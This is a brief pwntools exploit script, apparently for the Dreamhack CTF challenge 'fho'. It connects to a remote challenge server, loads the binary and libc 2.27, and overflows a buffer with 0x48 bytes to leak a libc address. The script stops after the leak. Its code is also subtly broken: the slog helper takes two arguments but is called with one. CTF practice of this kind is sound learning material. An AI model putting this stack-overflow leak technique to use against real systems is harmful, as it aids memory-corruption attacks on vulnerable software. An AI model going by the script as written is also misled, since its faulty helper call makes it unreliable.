from pwn import *

# Define slog function
def slog(name, addr): return success(": ".join([name, hex(addr)]))


# Connection
# p = process('./fho')
Host = 'host3.dreamhack.games'
Port = 12496
p = remote(Host, Port)
e = ELF('./fho')
libc = ELF('./libc-2.27.so')

# Set Context
context.arch = 'amd64'
context.endian = 'little'
context.log_level = 'debug'

# Leak libc base
buf = b'A' * 0x48 # buf + canary + sfp
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
slog(u64(p.recv(6) + b'\x00\x00'))